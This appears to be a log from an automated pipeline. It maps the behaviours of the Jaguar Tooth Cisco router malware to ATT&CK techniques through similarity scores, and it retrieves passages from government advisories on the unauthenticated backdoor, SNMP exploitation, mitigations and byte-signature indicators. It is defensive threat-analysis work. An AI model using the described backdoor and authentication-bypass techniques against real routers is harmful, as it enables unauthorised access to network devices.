[2025-03-27 12:05:49,301 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: network device authentication]: tensor([[0.7139]])
[2025-03-27 12:05:49,314 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: reversible encryption]: tensor([[0.4870]])
[2025-03-27 12:05:49,327 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: multi-factor authentication]: tensor([[0.5693]])
[2025-03-27 12:05:49,339 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: hybrid identity]: tensor([[0.5731]])
[2025-03-27 12:05:49,358 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: network provider dll]: tensor([[0.6005]])
[2025-03-27 12:05:49,373 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: conditional access policies]: tensor([[0.5460]])
[2025-03-27 12:05:49,386 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure]: tensor([[0.3315]])
[2025-03-27 12:05:49,400 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: create snapshot]: tensor([[0.2350]])
[2025-03-27 12:05:49,415 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: create cloud instance]: tensor([[0.2077]])
[2025-03-27 12:05:49,428 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: delete cloud instance]: tensor([[0.2740]])
[2025-03-27 12:05:49,442 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: revert cloud instance]: tensor([[0.2351]])
[2025-03-27 12:05:49,457 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: modify cloud compute configurations]: tensor([[0.2201]])
[2025-03-27 12:05:49,469 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud resource hierarchy]: tensor([[0.2359]])
[2025-03-27 12:05:49,481 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify registry]: tensor([[0.4055]])
[2025-03-27 12:05:49,493 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify system image]: tensor([[0.3623]])
[2025-03-27 12:05:49,507 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify system image: patch system image]: tensor([[0.4172]])
[2025-03-27 12:05:49,520 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify system image: downgrade system image]: tensor([[0.4289]])
[2025-03-27 12:05:49,531 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [network boundary bridging]: tensor([[0.2621]])
[2025-03-27 12:05:49,542 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [network boundary bridging: network address translation traversal]: tensor([[0.3281]])
[2025-03-27 12:05:49,554 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information]: tensor([[0.3677]])
[2025-03-27 12:05:49,566 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: binary padding]: tensor([[0.2865]])
[2025-03-27 12:05:49,582 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: software packing]: tensor([[0.2672]])
[2025-03-27 12:05:49,601 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: steganography]: tensor([[0.1600]])
[2025-03-27 12:05:49,615 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: compile after delivery]: tensor([[0.2385]])
[2025-03-27 12:05:49,628 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: indicator removal from tools]: tensor([[0.3296]])
[2025-03-27 12:05:49,644 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: html smuggling]: tensor([[0.1449]])
[2025-03-27 12:05:49,658 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: dynamic api resolution]: tensor([[0.3497]])
[2025-03-27 12:05:49,670 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: stripped payloads]: tensor([[0.2053]])
[2025-03-27 12:05:49,685 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: embedded payloads]: tensor([[0.2506]])
[2025-03-27 12:05:49,697 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: command obfuscation]: tensor([[0.2726]])
[2025-03-27 12:05:49,715 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: fileless storage]: tensor([[0.1915]])
[2025-03-27 12:05:49,728 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: lnk icon smuggling]: tensor([[0.1757]])
[2025-03-27 12:05:49,744 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: encrypted/encoded file]: tensor([[0.2101]])
[2025-03-27 12:05:49,761 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: polymorphic code]: tensor([[0.2860]])
[2025-03-27 12:05:49,776 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [plist file modification]: tensor([[0.2942]])
[2025-03-27 12:05:49,789 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot]: tensor([[0.3152]])
[2025-03-27 12:05:49,802 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: system firmware]: tensor([[0.1616]])
[2025-03-27 12:05:49,815 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: component firmware]: tensor([[0.3537]])
[2025-03-27 12:05:49,828 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: bootkit]: tensor([[0.2099]])
[2025-03-27 12:05:49,840 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: rommonkit]: tensor([[0.4262]])
[2025-03-27 12:05:49,854 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: tftp boot]: tensor([[0.2915]])
[2025-03-27 12:05:49,869 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection]: tensor([[0.3865]])
[2025-03-27 12:05:49,880 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: dynamic-link library injection]: tensor([[0.3616]])
[2025-03-27 12:05:49,891 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: portable executable injection]: tensor([[0.3730]])
[2025-03-27 12:05:49,905 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: thread execution hijacking]: tensor([[0.4456]])
[2025-03-27 12:05:49,917 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: asynchronous procedure call]: tensor([[0.4023]])
[2025-03-27 12:05:49,929 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: thread local storage]: tensor([[0.4566]])
[2025-03-27 12:05:49,941 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: ptrace system calls]: tensor([[0.4594]])
[2025-03-27 12:05:49,953 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: proc memory]: tensor([[0.3768]])
[2025-03-27 12:05:49,965 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: extra window memory injection]: tensor([[0.3394]])
[2025-03-27 12:05:49,977 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: process hollowing]: tensor([[0.3535]])
[2025-03-27 12:05:49,989 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: process doppelgänging]: tensor([[0.4210]])
[2025-03-27 12:05:50,002 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: vdso hijacking]: tensor([[0.3788]])
[2025-03-27 12:05:50,015 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: listplanting]: tensor([[0.3967]])
[2025-03-27 12:05:50,027 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [reflective code loading]: tensor([[0.2366]])
[2025-03-27 12:05:50,041 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [rogue domain controller]: tensor([[0.3240]])
[2025-03-27 12:05:50,053 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [rootkit]: tensor([[0.4101]])
[2025-03-27 12:05:50,067 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls]: tensor([[0.4279]])
[2025-03-27 12:05:50,083 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: gatekeeper bypass]: tensor([[0.3360]])
[2025-03-27 12:05:50,095 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: code signing]: tensor([[0.2821]])
[2025-03-27 12:05:50,113 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: sip and trust provider hijacking]: tensor([[0.4419]])
[2025-03-27 12:05:50,129 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: install root certificate]: tensor([[0.3491]])
[2025-03-27 12:05:50,146 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: mark-of-the-web bypass]: tensor([[0.3475]])
[2025-03-27 12:05:50,159 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: code signing policy modification]: tensor([[0.3353]])
[2025-03-27 12:05:50,174 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution]: tensor([[0.4009]])
[2025-03-27 12:05:50,190 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: compiled html file]: tensor([[0.3207]])
[2025-03-27 12:05:50,203 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: control panel]: tensor([[0.3748]])
[2025-03-27 12:05:50,216 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: cmstp]: tensor([[0.4221]])
[2025-03-27 12:05:50,232 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: installutil]: tensor([[0.3197]])
[2025-03-27 12:05:50,245 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: mshta]: tensor([[0.4570]])
[2025-03-27 12:05:50,258 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: msiexec]: tensor([[0.3907]])
[2025-03-27 12:05:50,271 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: odbcconf]: tensor([[0.3139]])
[2025-03-27 12:05:50,283 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: regsvcs/regasm]: tensor([[0.4070]])
[2025-03-27 12:05:50,296 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: regsvr32]: tensor([[0.4067]])
[2025-03-27 12:05:50,314 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: rundll32]: tensor([[0.3537]])
[2025-03-27 12:05:50,326 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: verclsid]: tensor([[0.4016]])
[2025-03-27 12:05:50,339 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: mavinject]: tensor([[0.3705]])
[2025-03-27 12:05:50,355 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: mmc]: tensor([[0.4013]])
[2025-03-27 12:05:50,369 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: electron applications]: tensor([[0.1608]])
[2025-03-27 12:05:50,381 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system script proxy execution]: tensor([[0.3960]])
[2025-03-27 12:05:50,400 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system script proxy execution: pubprn]: tensor([[0.3241]])
[2025-03-27 12:05:50,418 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system script proxy execution: syncappvpublishingserver]: tensor([[0.3664]])
[2025-03-27 12:05:50,434 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [template injection]: tensor([[0.2446]])
[2025-03-27 12:05:50,451 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [traffic signaling]: tensor([[0.3085]])
[2025-03-27 12:05:50,464 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [traffic signaling: port knocking]: tensor([[0.3590]])
[2025-03-27 12:05:50,478 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [traffic signaling: socket filters]: tensor([[0.2781]])
[2025-03-27 12:05:50,491 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [trusted developer utilities proxy execution]: tensor([[0.3713]])
[2025-03-27 12:05:50,504 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [trusted developer utilities proxy execution: msbuild]: tensor([[0.3489]])
[2025-03-27 12:05:50,521 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [trusted developer utilities proxy execution: clickonce]: tensor([[0.3795]])
[2025-03-27 12:05:50,533 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [unused/unsupported cloud regions]: tensor([[0.2260]])
[2025-03-27 12:05:50,545 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material]: tensor([[0.5879]])
[2025-03-27 12:05:50,558 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material: application access token]: tensor([[0.5871]])
[2025-03-27 12:05:50,572 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material: pass the hash]: tensor([[0.5301]])
[2025-03-27 12:05:50,585 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material: pass the ticket]: tensor([[0.3812]])
[2025-03-27 12:05:50,597 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material: web session cookie]: tensor([[0.5239]])
[2025-03-27 12:05:50,615 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts]: tensor([[0.5422]])
[2025-03-27 12:05:50,628 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts: default accounts]: tensor([[0.2984]])
[2025-03-27 12:05:50,641 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts: domain accounts]: tensor([[0.3711]])
[2025-03-27 12:05:50,654 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts: local accounts]: tensor([[0.5008]])
[2025-03-27 12:05:50,668 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts: cloud accounts]: tensor([[0.2223]])
[2025-03-27 12:05:50,686 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3175]])
[2025-03-27 12:05:50,703 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.3363]])
[2025-03-27 12:05:50,721 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.3651]])
[2025-03-27 12:05:50,734 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.3017]])
[2025-03-27 12:05:50,745 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [weaken encryption]: tensor([[0.2641]])
[2025-03-27 12:05:50,757 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [weaken encryption: reduce key space]: tensor([[0.2320]])
[2025-03-27 12:05:50,772 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [weaken encryption: disable crypto hardware]: tensor([[0.3607]])
[2025-03-27 12:05:50,784 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [xsl script processing]: tensor([[0.0250]])
[2025-03-27 12:05:50,787 INFO] ++ Scores: [('modify authentication process: network device authentication', tensor([[0.7139]])), ('modify authentication process: domain controller authentication', tensor([[0.6288]])), ('modify authentication process: password filter dll', tensor([[0.6236]])), ('modify authentication process', tensor([[0.6129]])), ('modify authentication process: network provider dll', tensor([[0.6005]]))]
[2025-03-27 12:05:50,787 INFO] ++ Similar techniques found:
['modify authentication process: network device authentication', 'modify authentication process: domain controller authentication', 'modify authentication process: password filter dll', 'modify authentication process', 'modify authentication process: network provider dll']
[2025-03-27 12:05:50,787 INFO] ++ Querying the QA model for action Modify Authentication Process as used by the malware with the following context:
modify authentication process: network device authentication
modify authentication process: domain controller authentication
modify authentication process: password filter dll
modify authentication process
modify authentication process: network provider dll
[2025-03-27 12:05:51,692 INFO] ++ QA suggested technique: modify authentication process: password filter dll
[2025-03-27 12:05:51,692 INFO] ++ Selected technique: modify authentication process: password filter dll
[2025-03-27 12:05:55,607 INFO] ++ Refining the action: Modify Authentication Process as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Added comments to the Workaround configuration commands to document which exclusions tie to the vulnerable MIBs.Vulnerable Products, WorkaroundsInterim2017-JUL-031.0Initial public release.—Interim2017-JUN-29Show LessLegal DisclaimerTHIS DOCUMENT IS PROVIDED ON AN "AS IS" BASIS AND DOES NOT IMPLY ANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='Don’t reuse the same password for multiple devices.\n\nEach device should have a unique password.\n\nWhere possible, avoid legacy password-based authentication and implement two-factor authentication based on public-private key.Disable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.')]
[2025-03-27 12:06:21,790 INFO] ++ Pre-conditions computed for action: Modify Authentication Process as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It enables unauthenticated backdoor access by patching Cisco IOS authentication routines .\n\nThis \ngrants access to existing local accounts  without checking the provided password, when connecting \nvia Telnet or physical session .\n\nFurther details are discussed in the ‘Functionality ( Unauthenticated \nbackdoor )’ section of this report.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='The vulnerabilities affect all versions of SNMP - Versions 1, 2c, and 3.\n\nTo exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.\n\nTo exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.')]
[2025-03-27 12:06:35,897 INFO] ++ Post-conditions computed for action: Modify Authentication Process as used by the malware using 7 documents:
[Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It enables unauthenticated backdoor access by patching Cisco IOS authentication routines .\n\nThis \ngrants access to existing local accounts  without checking the provided password, when connecting \nvia Telnet or physical session .\n\nFurther details are discussed in the ‘Functionality ( Unauthenticated \nbackdoor )’ section of this report.')]
[2025-03-27 12:06:39,808 INFO] ++ Indicators computed for action: Modify Authentication Process as used by the malware. The indicators are:
['The content contains "| 03   81   60   00   0 8 |".', 'The content contains "| 24   02   00   0 1 |".']
[2025-03-27 12:06:45,617 INFO] + Processing action: Modify System Image: Patch System Image as used by the malware
[2025-03-27 12:06:47,153 INFO] ++ Embedding computed for: Modify System Image: Patch System Image as used by the malware. The vector has shape: (384,)
[2025-03-27 12:06:47,166 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism]: tensor([[0.3293]])
[2025-03-27 12:06:47,181 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: setuid and setgid]: tensor([[0.3851]])
[2025-03-27 12:06:47,193 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: bypass user account control]: tensor([[0.3660]])
[2025-03-27 12:06:47,213 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: sudo and sudo caching]: tensor([[0.3502]])
[2025-03-27 12:06:47,224 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: elevated execution with prompt]: tensor([[0.3617]])
[2025-03-27 12:06:47,236 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: temporary elevated cloud access]: tensor([[0.2617]])
[2025-03-27 12:06:47,247 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [abuse elevation control mechanism: tcc manipulation]: tensor([[0.3337]])
[2025-03-27 12:06:47,259 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation]: tensor([[0.3540]])
[2025-03-27 12:06:47,272 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: token impersonation/theft]: tensor([[0.3350]])
[2025-03-27 12:06:47,293 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: create process with token]: tensor([[0.3326]])
[2025-03-27 12:06:47,304 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: make and impersonate token]: tensor([[0.3632]])
[2025-03-27 12:06:47,319 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: parent pid spoofing]: tensor([[0.3486]])
[2025-03-27 12:06:47,331 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [access token manipulation: sid-history injection]: tensor([[0.3703]])
[2025-03-27 12:06:47,344 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [bits jobs]: tensor([[0.3128]])
[2025-03-27 12:06:47,355 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [build image on host]: tensor([[0.3744]])
[2025-03-27 12:06:47,376 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [debugger evasion]: tensor([[0.3278]])
[2025-03-27 12:06:47,386 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [deobfuscate/decode files or information]: tensor([[0.3678]])
[2025-03-27 12:06:47,397 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [deploy container]: tensor([[0.3456]])
[2025-03-27 12:06:47,408 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [direct volume access]: tensor([[0.1796]])
[2025-03-27 12:06:47,418 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [domain or tenant policy modification]: tensor([[0.3226]])
